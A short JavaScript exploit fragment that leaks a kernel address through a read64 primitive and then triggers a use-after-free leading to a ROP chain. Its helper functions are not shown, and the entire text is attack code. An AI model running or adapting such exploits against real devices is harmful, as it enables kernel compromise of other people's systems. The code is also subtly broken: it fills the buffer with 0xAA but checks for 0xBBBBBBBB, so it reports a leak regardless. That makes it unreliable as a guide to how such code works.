function run_payload() {
  debug_log("Payload started. Preparing to leak kernel address...");

  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  schedule_read64(0xFFFFFFFF82600000);

  // Poll right away
  let tries = 0;
  const view = new DataView(read_target.buffer);
  const interval = setInterval(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);
    if (lo !== 0xAAAAAAAA || hi !== 0xBBBBBBBB) {
      const val = (BigInt(hi) << 32n) | BigInt(lo);
      debug_log("✅ read64 result: 0x" + val.toString(16));
      clearInterval(interval);
    }
    if (++tries > 20) {
      debug_log("❌ No leak detected after 4s.");
      clearInterval(interval);
    }
  }, 200);

  // Double delay before exploit fires
  setTimeout(() => {
    debug_log("Triggering exploit in 1.5s...");
    setTimeout(() => {
      debug_log("🔥 Launching UAF → ROP...");
      triggerUAF();
    }, 1500);
  }, 100);
}
